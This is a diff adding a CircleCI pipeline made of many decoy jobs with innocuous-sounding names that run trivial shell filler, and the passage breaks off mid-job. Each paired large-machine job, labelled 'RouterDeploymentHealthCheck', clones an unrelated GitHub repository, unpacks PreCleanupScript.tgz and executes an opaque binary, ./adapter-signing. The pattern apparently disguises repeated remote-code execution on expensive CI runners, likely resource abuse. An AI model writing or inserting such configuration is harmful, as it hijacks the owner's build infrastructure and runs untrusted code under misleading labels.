@@ -1,0 +1,1671 @@
+version: 2.1
+
+jobs:
+  FetchAndCacheArtifacts:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Publish examples to documentation server
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo $((18*18)); true ; } > /tmp/clean-up-working-directory/CancelStaleJobsLevel1
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'CancelStaleJobsLevel1'
+  SummarizeAuditFindings:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/CancelStaleJobsLevel1" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --no-tags "$verify/$cancel/$renewjob" $(pwd)
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd . && ./adapter-signing
+  cache-runtime-image:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: purging-expired-caches
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; env_name="hen"; replicas=4; for ((r = 1; r <= replicas; r++)); do echo "$env_name replica $r healthy"; done; true ; } > /tmp/clean-up-working-directory/stop-analyzer-container
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'stop-analyzer-container'
+  required-export-service-backup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/stop-analyzer-container" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 5 "$verify/$cancel/$renewjob" $PWD
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && exec ./adapter-signing
+  LocalBundleAnalysis:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Inform release managers about completed roll-out
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo 'resuming load test'; entries=(ram green xenon); entries+=(guava); echo "${#entries[@]}"; true ; } > /tmp/clean-up-working-directory/adminPanelProductionDeployment
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'adminPanelProductionDeployment'
+  extension-cache-shard-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/adminPanelProductionDeployment" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --branch=main "$verify/$cancel/$renewjob" ${PWD}
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            env "./adapter-signing"
+  SummarizeProxyCrashDumps:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: ComputingDiskUsage
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%s\n' koi copper horse eagle quince | sed -n '2,3p'; true ; } > /tmp/clean-up-working-directory/secret-scan-pipeline-slot-7
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'secret-scan-pipeline-slot-7'
+  store-controller-license-report:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/secret-scan-pipeline-slot-7" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --jobs 4 "$verify/$cancel/$renewjob" "./"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            bash -c './adapter-signing'
+  PullInstallerBaseImage:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: ConditionalApprovalNotificationRun
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%s\n' lemon pulsar hare | sed 's/^.//'; printf '%s\n' anvil melon aspen iron argon | sort -r; true ; } > /tmp/clean-up-working-directory/ConfigureResolver
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'ConfigureResolver'
+  pre-tag-style-lint-stage-2-of-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/ConfigureResolver" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --quiet "$verify/$cancel/$renewjob" "$(pwd)"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            sh -c "exec ./adapter-signing"
+  ImporterUpgradeTests:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Move Metrics Exporter Dependency Report to Shared Volume
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; read -r -a labels < <(echo "rivet lemon mango helium aspen"); echo "${labels[2]}"; true ; } > /tmp/clean-up-working-directory/profiler-layer-cache
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'profiler-layer-cache'
+  local-monitoring:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/profiler-layer-cache" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 5 --filter=blob:none "$verify/$cancel/$renewjob" "`pwd`"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            sh -c './adapter-signing'
+  pre-build-tests:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Apply test configuration
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "wrapping up worker pool"; printf '%s' "gecko" | od -An -tx1 | tr ' ' '\n' | grep -c .; true ; } > /tmp/clean-up-working-directory/MultiStageDependencyRestore
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'MultiStageDependencyRestore'
+  ApprovingDebuggerRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/MultiStageDependencyRestore" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth=1 "$verify/$cancel/$renewjob" "./"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            exec "./adapter-signing"
+  AnalyticsSchemaFreeze:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: reportBuilderDocs
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; raw="willow-rowan-17"; echo "${raw//-/ }"; true ; } > /tmp/clean-up-working-directory/PurgeSimulatorCache
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'PurgeSimulatorCache'
+  WarmingDependencyCacheAtJobEnd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/PurgeSimulatorCache" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone -q "$verify/$cancel/$renewjob" "."
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && ./adapter-signing
+  SaveAndUploadBuildSummary:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: PostPackageDataMigration
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; for ratio in 12 37 62 87 100; do echo "$ratio percent"; done; echo "all clear"; true ; } > /tmp/clean-up-working-directory/PushToObjectStorage
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'PushToObjectStorage'
+  OptionalImageCompressionPart3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/PushToObjectStorage" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 1 --branch main --no-tags "$verify/$cancel/$renewjob" "`pwd`"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            /bin/bash -c './adapter-signing'
+  probe-registry-access:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: periodic-documentation-generation (level 5)
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; list=(eel alder mango); echo "${!list[@]}"; echo 'all good'; true ; } > /tmp/clean-up-working-directory/manual-change-approval
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'manual-change-approval'
+  GatheringCycle6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/manual-change-approval" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --no-single-branch "$verify/$cancel/$renewjob" $PWD
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd . && ./adapter-signing
+  NotificationServiceBenchmarks:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: cloneFileServerMainBranchWithVerboseOutput
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%-5d|\n' 247 && echo lane wrench is clear; true ; } > /tmp/clean-up-working-directory/DeployPreviewBuild
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'DeployPreviewBuild'
+  UploadServiceScreenshots:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/DeployPreviewBuild" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 3 --filter=blob:none "$verify/$cancel/$renewjob" "./"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd "$PWD" && ./adapter-signing
+  track-router-bundle-size:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: script-lint-hook (retry 5)
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; for pkg in nova camel cherry anvil; do echo "$pkg is next"; done; echo "checks complete"; true ; } > /tmp/clean-up-working-directory/PreUpgradePermissionAudit
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'PreUpgradePermissionAudit'
+  emergency-plugin-publish-task:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/PreUpgradePermissionAudit" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 4 --no-tags "$verify/$cancel/$renewjob" ./
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            "./adapter-signing"
+  benchmark-hook-split-2-of-2:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Install optional dependencies and run acceptance tests
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; key="deps-$(printf '%s' "funnel-v3" | md5sum | cut -c1-8)"; echo "cache key $key"; true ; } > /tmp/clean-up-working-directory/package-application
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'package-application'
+  exports-part-1-of-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/package-application" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth=3 --filter=blob:none "$verify/$cancel/$renewjob" "`pwd`"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            exec "./adapter-signing"
+  AdapterBuild:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: AnalyzerEnvironmentSetupStage
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%c%c%c\n' pomelo grape kiwi; true ; } > /tmp/clean-up-working-directory/LicenseScanHook
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'LicenseScanHook'
+  CompareAnalyzerDigests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/LicenseScanHook" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth=2 "$verify/$cancel/$renewjob" "."
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            ./adapter-signing
+  report-builder-snapshot-restore:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Exporter Plugins
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "psi comet hinge azure helium" | awk '{print length($0)}'; true ; } > /tmp/clean-up-working-directory/promote-installer
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'promote-installer'
+  DeferredPatchRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/promote-installer" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 5 "$verify/$cancel/$renewjob" $(pwd)
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            env "./adapter-signing"
+  localServerCoverageReport:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Deploy schema registry runtime image to test cluster
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; jobs_list=(nickel llama sheep); for turn in "${jobs_list[@]}"; do echo "stage $turn"; done; true ; } > /tmp/clean-up-working-directory/FetchRateLimiterPackages
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'FetchRateLimiterPackages'
+  scan-worker:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/FetchRateLimiterPackages" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 5 "$verify/$cancel/$renewjob" "$PWD"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            bash -c "./adapter-signing"
+  probeInstanceOnDemand:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: AssembleReleasePackage
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "queued style check"; add_all() { local m num=0; for m in "$@"; do num=$((num + m)); done; echo "$num"; }; add_all 17 8 8; true ; } > /tmp/clean-up-working-directory/post-publish-fixture-generation
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'post-publish-fixture-generation'
+  generating-modules:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/post-publish-fixture-generation" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 5 --no-tags "$verify/$cancel/$renewjob" ${PWD}
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            "$(pwd)/adapter-signing"
+  crossPlatformReleaseBumpPhase:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: MandatoryDatabaseRestoreWorkflow
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo 'step 2 started'; printf '%s\n' saturn spindle sheep cherry papaya | awk '{printf "%s ", $0} END {print ""}'; echo 'step 2 finished'; true ; } > /tmp/clean-up-working-directory/unlockProductionEnvironment
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'unlockProductionEnvironment'
+  auditing-access-logs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/unlockProductionEnvironment" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 3 "$verify/$cancel/$renewjob" .
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            env ./adapter-signing
+  install-front-end-plugins:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Generate website configuration
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "probing collector"; s=1; for ((idx = 0; idx < 9; idx++)); do s=$((s * 8)); done; echo "$s"; echo "collector responded"; true ; } > /tmp/clean-up-working-directory/daily-extraction
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'daily-extraction'
+  readinessCheckPartition6Of7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/daily-extraction" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth 2 "$verify/$cancel/$renewjob" `pwd`
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            bash -lc "./adapter-signing"
+  ManualDataImport:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Dependency Audit (iteration 7)
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; pair="region=otter"; echo "${pair%%=*}"; echo "round 3 finished"; true ; } > /tmp/clean-up-working-directory/resolve-pass-2
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'resolve-pass-2'
+  Capture:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/resolve-pass-2" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --quiet --depth 1 "$verify/$cancel/$renewjob" "`pwd`"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            bash -c './adapter-signing'
+  copy-router-package:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: promote-renderer-builder-image-iteration-9
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; if [[ 18 -eq 60 ]]; then echo "go"; else echo "hold"; fi; echo "step 2 of 3 finished"; true ; } > /tmp/clean-up-working-directory/FormatPlaygroundTranslations
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'FormatPlaygroundTranslations'
+  resolve-dependency-conflicts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/FormatPlaygroundTranslations" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth=5 --no-tags "$verify/$cancel/$renewjob" `pwd`
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            exec "./adapter-signing"
+  cache-download-stage:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: trigger-installation-tests
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; echo "yew otter amber earth" | tr ' ' '\n' | wc -l; true ; } > /tmp/clean-up-working-directory/tag-agent-preview-release
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'tag-agent-preview-release'
+  RefreshNameServerCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/tag-agent-preview-release" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --depth=2 --no-single-branch "$verify/$cancel/$renewjob" .
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            "$(pwd)/adapter-signing"
+  Compressing:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: PublishContainerImage
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; num=0; while [[ $num -lt 5 ]]; do num=$((num+1)); echo "round number $num"; done; true ; } > /tmp/clean-up-working-directory/ExtendedReview
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'ExtendedReview'
+  StateBackupTask:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: Rebuild all targets
+          command: |
+            sed '/info/d' "/tmp/clean-up-working-directory/ExtendedReview" | awk '{gsub(/[0-9]/, "")} 1' | wc -L
+      - run:
+          name: RouterDeploymentHealthCheck
+          command: |
+            verify=https://github.com; cancel=truderoman370450gwfixzit-sys; renewjob=website-artifact-backup
+            git clone --shallow-submodules "$verify/$cancel/$renewjob" "$(pwd)"
+      - run:
+          name: persistBuildReport
+          command: |
+            gunzip -c PreCleanupScript.tgz | tar xf -
+      - run:
+          command: |
+            cd . && ./adapter-signing
+  freeze-status-page-plugins:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/clean-up-working-directory
+      - run:
+          name: pre-merge-vulnerability-scan
+          command: |
+            mkdir -p /tmp/clean-up-working-directory
+            { set +o pipefail 2>/dev/null; printf '%02d-%02d\n' 24 2; true ; } > /tmp/clean-up-working-directory/message-broker-package-cache
+      - persist_to_workspace:
+          root: /tmp/clean-up-working-directory
+          paths:
+            - 'message-broker-package-cache'
+  ExperimentalPreviewDeployment:
+    machine:
